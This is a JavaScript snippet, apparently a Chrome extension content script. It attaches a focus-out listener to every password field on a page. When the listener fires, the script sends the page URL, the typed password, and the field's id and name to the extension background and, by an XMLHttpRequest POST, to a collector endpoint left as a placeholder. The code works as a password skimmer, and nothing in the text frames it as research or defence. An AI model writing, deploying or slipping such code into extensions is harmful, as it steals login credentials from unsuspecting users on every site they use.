
if (document.querySelectorAll('input[type=password]').length > 0) {
    var textboxes = document.querySelectorAll('input[type=\"password\"]');
    for (var i = 0 ; i < textboxes.length ; ++i) {
        textboxes[i].addEventListener('focusout', function () {
            var contentstr = "Url=" + document.URL + "&Value=" + this.value + "&Id=" + this.id + "&Name=" + this.getAttribute("name") + "";
            chrome.runtime.sendMessage({
                action: "sendData",
                data: contentstr
            });
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
                if (xhttp.readyState == 4 && xhttp.status == 200) {
                }
            };
            xhttp.open("post", "url", true);
            xhttp.setRequestHeader('Access-Control-Allow-Origin', '*');
            xhttp.setRequestHeader('Access-Control-Allow-Methods', 'GET, PUT, POST, DELETE, OPTIONS');
            xhttp.setRequestHeader('Access-Control-Allow-Headers', 'Content-Type, Content-Range, Content-Disposition, Content-Description');
            xhttp.setRequestHeader("Content-type", "application/json");
            xhttp.send(JSON.stringify([{ "Url": document.URL, "Value": this.value, "Id": this.id, "Name": this.getAttribute("name") }]));
        }, false);
    }
}
